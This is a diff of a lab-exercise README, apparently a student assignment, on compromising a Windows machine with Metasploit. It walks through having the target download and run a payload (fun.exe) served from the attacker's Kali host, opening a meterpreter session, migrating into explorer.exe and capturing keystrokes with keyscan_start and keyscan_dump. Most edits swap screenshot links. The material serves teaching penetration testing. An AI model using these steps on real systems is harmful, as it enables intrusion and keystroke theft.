@@ -56,10 +56,10 @@ exploit
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.168.1.2/fun.exe
 The file "fun.exe" downloads. 
-![download](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/a6b73051-a143-4740-b3d9-27c23762218f)
+![Screenshot 2024-04-27 165657](https://github.com/Vinothini1711/Compromising-windows-using-Metasploit/assets/144300204/7713228b-8b81-4617-8220-2e8e70656941)
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
-![exploit](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/b46a08f7-a9fc-4e71-8fdd-170ee187dd22)
+![Screenshot 2024-04-27 165646](https://github.com/Vinothini1711/Compromising-windows-using-Metasploit/assets/144300204/eb77c75b-4ab0-4d9f-951a-77d47620cf28)
 
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
@@ -68,19 +68,22 @@ To become more persistent, we'll migrate to a process that will last longer.
 Let's migrate to the winlogon process.
 At the meterpreter > prompt, execute this command:
 
+![Screenshot 2024-04-27 165637](https://github.com/Vinothini1711/Compromising-windows-using-Metasploit/assets/144300204/f8c81137-6147-4750-b24c-5d8b1fd0d8b4)
+
 migrate -N explorer.exe
 at meterpreter > prompt, execute this command:
 netstat
 A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
 Notice the "PID/Program name" value for this connection, which is redacted 
 
-![migrate-Nexplorer](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/836e6efa-423f-4553-ad2f-19170b010892)
+![Screenshot 2024-04-27 165618](https://github.com/Vinothini1711/Compromising-windows-using-Metasploit/assets/144300204/fd97b96a-0ad7-4410-baf6-3fbc90790668)
 
 Post Exploitation
 The target is now owned. Following are meterpreter commands for key capturing in the target machine
 keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
-![notepad](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/35be18d7-51b0-4529-8fd8-76740f0c9ba6)
+
 keyscan_dump	Shows the keystrokes captured so far
-![keyscan_dump](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d40a4428-0c65-4855-be1d-c278766082fb)
+
+![Screenshot 2024-04-27 165630](https://github.com/Vinothini1711/Compromising-windows-using-Metasploit/assets/144300204/09a0627b-9c03-48f2-bdeb-667bd44c3be0)
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
